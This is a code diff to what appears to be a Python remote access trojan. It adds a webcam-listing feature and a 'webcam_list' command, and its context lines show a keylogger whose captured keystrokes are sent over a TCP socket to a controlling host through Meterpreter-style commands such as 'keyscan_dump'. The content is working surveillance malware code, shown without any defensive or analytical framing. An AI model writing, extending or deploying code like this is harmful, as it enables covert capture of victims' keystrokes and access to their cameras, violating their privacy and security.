@@ -111,6 +111,22 @@ def dump_keylogger_data():
     keylogger_data = []  # Clear the data after dumping
     return data
 
+# Function to list webcams
+def list_webcams():
+    webcams = []
+    index = 0
+    while True:
+        cap = cv2.VideoCapture(index)
+        if cap.isOpened():
+            # Get the webcam name (this depends on your platform)
+            webcam_name = f"{index}: {cap.getBackendName()}"
+            webcams.append(webcam_name)
+            cap.release()
+        else:
+            break
+        index += 1
+    return '\n'.join(webcams)
+
 def main():
     try:
         client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -136,6 +152,10 @@ def main():
                 stop_keylogger()
             elif command == "keyscan_dump":
                 client_socket.send(dump_keylogger_data().encode('utf-8'))
+            elif command == "webcam_list":
+                print("[*] Requesting webcam list...")
+                webcam_list = list_webcams()
+                client_socket.send(webcam_list.encode('utf-8'))
         except Exception as e:
             print(f"Error: {e}")
             break
